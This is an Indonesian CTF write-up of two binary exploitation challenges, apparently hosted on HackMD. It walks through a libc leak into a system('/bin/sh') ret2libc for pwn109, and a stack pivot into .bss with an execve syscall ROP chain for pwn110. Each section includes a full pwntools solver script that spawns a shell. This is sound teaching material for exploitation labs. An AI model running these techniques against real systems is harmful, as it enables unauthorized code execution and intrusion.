Jadi, di dalam **Binary File** nya. Hanya ada 1 vulnerability. Yaitu **Buffer Overflow** pada **gets(local_28);**. Dan dibawah functionnya adalah instruction RETURN. Lalu dari **checksec** juga **No PIE & No Canary**. Tapi tidak ada **function Win** untuk ke **shell**, dan tidak ada string **flag.txt**. Di bagian **ROP** juga gadgetnya sangat minim, dan **NX nya Enable**. Jadi tidak bisa dilakukan **spawn shell** tanpa **libc**. Dari sini arah exploitnya sudah jelas. Pertama, lakukan leak address untuk **libc** -> hitung base address libc -> RET ke main lagi -> Buffer Overflow -> Panggil **Gadget RET** agar tidak terjadi miss stack alignment -> Panggil **Gadget RDI** -> Masukkan address **libc** yang berisi string **'/bin/sh'** -> Masukkan address **libc** yang berisi instruction **system()** -> Mendapatkan **Shell** -> cat **flag.txt**.

![image](https://hackmd.io/_uploads/ByyMsBlbMg.png)

Ya, jadi intinya karena di Binary File tidak memungkinkan untuk memunculkan shell. Kita menggunakan instruction dan ROP pada **libc** yang di load dan digunakan oleh Binary File untuk exploit membuka / **popping shell**.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/Sytz3HlbGl.png)

Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/H1uXnrxZfl.png)

Oh, sebelum itu. Dari attachment file. Kalian harus melakukan **pwninit** terlebih dahulu. Kenapa? Karena Binary File dari attachment masih linked dengan libc dan ldd dari laptop kalian. Sedangkan dari **nc / remote**, bisa saja **libc dan ld** nya itu berbeda. Jadi kalian harus mendownload **libc dan ld** nya terlebih dahulu. Setelah itu lakukan command ini untuk menghubungkan **Binary File** dengan **libc dan ld** terbaru:

![image](https://hackmd.io/_uploads/rkoypSe-Gx.png)

```a
pwninit \ 
  --bin (File Binary) \
  --libc (file libc) \
  --ld (File ld)
```
Nah, di decompile binary nya hanya terdapat vulnerability **Buffer Overflow** dari instruction **gets()**. Lalu input akan disimpan ke **local_28**. Pertama, cek panjang char yang dibutuhkan untuk Overflow sampai ke **RET address** dengan menggunakan **pwndbg** dan **cyclic**.

![image](https://hackmd.io/_uploads/rkedWCSebMl.png)
![image](https://hackmd.io/_uploads/rkZfABg-ze.png)
![image](https://hackmd.io/_uploads/SJoG0SeWMg.png)
![image](https://hackmd.io/_uploads/B1lZZUxZGg.png)

Butuh 40 char untuk sampai ke RET address. Lalu selanjutnya, lakukan leak untuk libc addressnya. Dengan cara memanggil gadget **pop rdi**, lalu panggil address **GOT** yang ingin di leak. Lalu instruction **puts()** dari **plt**.

![image](https://hackmd.io/_uploads/BJXYCSlbMx.png)

Setelah leak, panggil address main paling awal agar Binary jump ke main+0 dan memanggil instruction **gets()** kembali.

![image](https://hackmd.io/_uploads/r1klyIl-fg.png)

Lalu, dari sini, lakukan perhitungan untuk base address dari libc.

![image](https://hackmd.io/_uploads/ryjukIgbfx.png)

Bisa dilihat, di bagian File (Base). Untuk mencapai base libc. Kita perlu mengurangi leak address ini dengan **0x83970**. Jadi: **base = leak_address - 0x83970**.

![image](https://hackmd.io/_uploads/SyCgeLg-Ml.png)

Lalu, selanjutnya cari 3 address ini:
**Gadget pop rdi**, untuk menyimpan string '/bin/sh'.
**String /bin/sh**, ambil dari libc karena di Binary File tidak ada harcoded string nya.
**instruction system()**, ambil dari libc dan digunakan untuk melakukan spawn shell. Jadi nanti yang ter execute adalah: **system('/bin/sh')**.

jadi, roadmap exploitnya adalah:
**Buffer Overflow** -> **POP RDI** -> **address GOT**, disini saya menggunakan **gets@GLIBC_2.2.5** -> **RET** ke main+0 -> Hitung **base address Libc** -> masuk ke **gets()** lagi -> **Buffer Overflow** -> Tambahkan **gadget RET** agar tidak miss stack alignment -> **POP RDI** -> **Address libc** untuk string **'/bin/sh'** -> **Address libc** untuk instruction **system()** -> **popping shell** -> **cat flag.txt**

![image](https://hackmd.io/_uploads/SJjffLg-Mg.png)

```a
from pwn import *

# context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn109'
p = process(chall)
# p = remote('10.48.189.97', 9009)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''

# ''')
p.recv()
payload = b'A' * 40
payload += p64(0x00000000004012a3) + p64(0x404020)
payload += p64(0x401060)
payload += p64(0x00000000004011f6)

p.sendline(payload)

hasil = p.recvline()
print('RECV 2',hasil)
hasil = hex(u64(hasil.strip().ljust(8, b'\x00')))

print('LIBC leak: ',hasil)
base = int(hasil, 16) - 0x83970
print('BASE: ',hex(base))

pop_rdi = 0x00000000004012a3
print('rdi: ',hex(pop_rdi))
bin_sh = base + 0x1b45bd
print('bin_sh: ',hex(bin_sh))
system = base + 0x000000000052290
print('system: ',hex(system))

sleep(2)

payload = b'A'*40
payload += p64(0x000000000040101a)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.sendline(payload)

p.interactive()


# LIBC leak:  0x7ffff7e56970
# BASE:  0x7ffff7dd3000
# rdi:  0x4012a3
# bin_sh:  0x7ffff7f875bd
# system:  0x7ffff7e25290

# Exploit:
# 
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```


##  Challange 10 - pwn110

###    Deskripsi
Playing with ROP
### TL; DR
Challange ini adalah **ROP CHAIN dan Spawn Shell** yang agak gak ribet. Disini kita hanya diberi attachment Binary File saja. Dan saat di check dari decompile Ghidra, Hanya ada vulnerability **Buffer Overflow**. Dan ketika di check ROP nya, sangat complicated dan banyak. Karena kebanyakan akhiran dari ROP nya itu **jmp ke sebuah address**, kita harus milih jmp yang aman juga. Jadi disini saya menghabiskan waktu kurang lebih 30 menit untuk menentukan alur dari **ROP chain**. Setelah ter build, tinggal ROP Chain aja terus di akhir manggil instruction **syscall()**. Dan bakal spawn shell -> cat flag.txt.

![image](https://hackmd.io/_uploads/H1nb_7Wbfg.png)
![image](https://hackmd.io/_uploads/H1kVs7WZMe.png)

Ya, jadi intinya karena kita tidak punya **libc**. Pilihannya hanya **ROP chain** ke **syscall 59**. Untuk **spawn shell**. Dan itu sangat memungkinkan, tapi ribet aja karena se complicated itu Binary File nya guys.

### Langkah Exploit
Pertama, lakukan ritual dulu. Dengan command checksec, 
> checksec ini biar tau aja programnya itu berapa bit dan apakah terdapat canary atau pie, apakah NX nya enable, dan RELRO nya full / patrial. Sebenernya ga terlalu guna command nya sekarang, tapi di materi seterusnya, bakal berguna banget. Jadi ini ritual setiap kita mengerjakan Chall ya adik adik.>

![image](https://hackmd.io/_uploads/BJ6MnQZZfe.png)

Nah, coba buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.

![image](https://hackmd.io/_uploads/BJ1EhQbWfx.png)

Nah. disini bisa dilihat kalau ada Buffer Overflow, dari fungsi **gets()**. Dan tidak ada pengecekan Canary di bawahnya.

![image](https://hackmd.io/_uploads/rJkVT7WZzg.png)

Di awal, ku coba cari ROP yang memungkinkan untuk set rax menjadi 59. Disini ada mov rax. Aslinya ada ini: ![image](https://hackmd.io/_uploads/ryfYCmWWGx.png) Tapi aku galihat tadi. Jadi hasilnya ribet banget.

![image](https://hackmd.io/_uploads/r16iCXWbzl.png)

Setelah itu cari pop r8, disini dia jmp ke 0x45c8c0 yang adalah **<__sigjmp_save>**. 

![image](https://hackmd.io/_uploads/rkik1V-bMl.png)

Agar aman sampai ke bagian ret, aku harus set **rsi menjadi 0**. jadi butuh pop rsi di paling atas.

![image](https://hackmd.io/_uploads/Hy3X1V-Wzg.png)

Ini gadgetnya. Setelah selesai set rax menjadi 59. Selanjutnya harus set rdi agar berisi string '/bin/sh'. Karena dari Binary File gaada strings /bin/sh sama sekali. Kita harus menuliskan sendiri ke **.bss**.

![image](https://hackmd.io/_uploads/B1B_xNbbfx.png)

Lalu setelah tahu bss nya, kita cari gadget ROP terakhir. Yaitu **syscall()**.

![image](https://hackmd.io/_uploads/Sku9eV-bGe.png)

Nah, semua gadget udah di dapatkan. Selanjutnya ini agak tricky. Karena kita akan merubah address dari saved RBP agar menunjuk .bss. Dan semua ROP chain akan kita taruh address **.bss** yang kosong.

![image](https://hackmd.io/_uploads/B1wgZ4--fl.png)

Kalau dilihat dari Ghidra. Ternyata setelah instruction **gets()**. Binary memanggil **LEAVE** instruction dulu sebelum **RET**.

![image](https://hackmd.io/_uploads/BJD_bNWZGl.png)

Dari penjelasan ini, kita tidak bisa memenuhi **local_28** sampai ke **RET instruction** dengan menggunakan **byte sampah** seperti **b"A" * 40**.

![image](https://hackmd.io/_uploads/BkazMNZZfe.png)

Yang harus dilakukan adalah memenuhi local_28 dengan **b"A" * 32**. Dan 8 byte sisanya adalah **Saved RBP**. Dimana harus diisi dengan address tujuan. Disini ku isi dengan address **.bss**. Karena semua payload akan dimasukkan kesana.

Jadi alur exploit akhirnya adalah:
**Buffer Overflow** sampai **Saved RBP** -> 
isi **Saved RBP** dengan address **.bss** -> 
RET ke instruction **gets()** -> 
Porgram execute **gets()** lalu kembali ke **gets()** lagi, menunggu input kedua -> 

Kirim payload ROP Chain:
**Pertama kirim p64(0)**, karena di penjelasan LEAVE tadi ada **pop rbp**. jadi agar tidak rusak ROP chainnya -> 
**pop rsi** -> 
**p64(0)**, isi rsi dengan **0** agar setelah **jmp** aman sampai ke **RET** lagi -> 
**pop r8** -> 
Setelah JMP selesai -> 
**p64(59)** set **r8** menjadi **59** untuk spawn shell di **syscall()** -> 
**pop rsp, mov rax < r8, pop r13** -> 
**p64(bss + 0x38)** set rsp ke address bss yang kosong. Disini aku set ke **bss + 0x38** untuk execute ROP chain terakhir -> 
**p64(0)** set nilai **r13** ke **0** aja -> 
isi sisanya dengan **nullbyte** sampai panjang payload **0x30** -> 
Lalu selanjutnya di 0x30 -> 
**pop rdi** -> 
Tunjuk **address bss** yang akan kita isi dengan **/bin/sh**, disini aku memilih **bss address + 0x60** -> 
**pop syscall** untuk spawn shell -> 
isi sisa payload dengan **nullbyte** sampai panjangnya **0x60** -> 
di **0x60**, isi byte mentah **b'/bin/sh\x00'** -> selesai.

![image](https://hackmd.io/_uploads/S1KkU4W-Me.png)
![image](https://hackmd.io/_uploads/SyyeLVbWMl.png)

SOLVER:
```a
from pwn import *

context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './pwn110'
# p = process(chall)
p = remote('10.48.179.171', 9010)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# ''')

bss = 0x4c2680
bin_sh_address = bss + 0x60
bin_sh = b'/bin/sh\x00'

# Payload Pertama:
payload = b'A' * 32 + p64(bss)
payload += p64(0x000000000040191a) # pop rdi
payload += p64(bss) # isi rdi sama alamat bss yang kosong
payload += p64(0x0000000000401ea5) #address gets() -> Harusnya habis gets() bakal ke lempar ke bss

# Payload kedua, ngisi bss
payload2 = p64(0)
payload2 += p64(0x000000000040f4de) # pop rsi
payload2 += p64(0) #set rsi -> 0
payload2 += p64(0x000000000045c8b0) #pop r8, jmp ke 0x45c8c0 
payload2 += p64(59) # set r8 -> 59
payload2 += p64(0x000000000041fb45) #pop rsp, set rax ke 59, pop r13
payload2 += p64(bss + 0x30 + 0x8) #set rsp ke 0x30 untuk melanjutkan ROP
payload2 += p64(0)
payload2 = payload2.ljust(0x30, b'\x00')

payload2 += p64(0x000000000040191a) #pop rdi
payload2 += p64(bss + 0x60) # address bss yang berisi strings /bin/sh
payload2 += p64(0x00000000004012d3) #syscall
payload2 = payload2.ljust(0x60, b'\x00')
payload2 += bin_sh

p.sendline(payload)
sleep(2)
p.sendline(payload2)
p.interactive()
```

## Thank You!!! Enjoy your Journey!

###### tags: `Binary Exploitation` `de13ugg1ng`
